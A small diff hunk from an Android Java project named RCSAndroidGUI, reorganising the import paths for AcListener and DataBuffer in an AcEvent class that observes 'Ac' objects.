@@ -5,9 +5,9 @@ import java.io.IOException;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Ac;
-import com.ht.RCSAndroidGUI.AcListener;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
-import com.ht.RCSAndroidGUI.utils.DataBuffer;
+import com.ht.RCSAndroidGUI.listener.AcListener;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
 
 public class AcEvent extends EventBase implements Observer<Ac> {
 	/** The Constant TAG. */
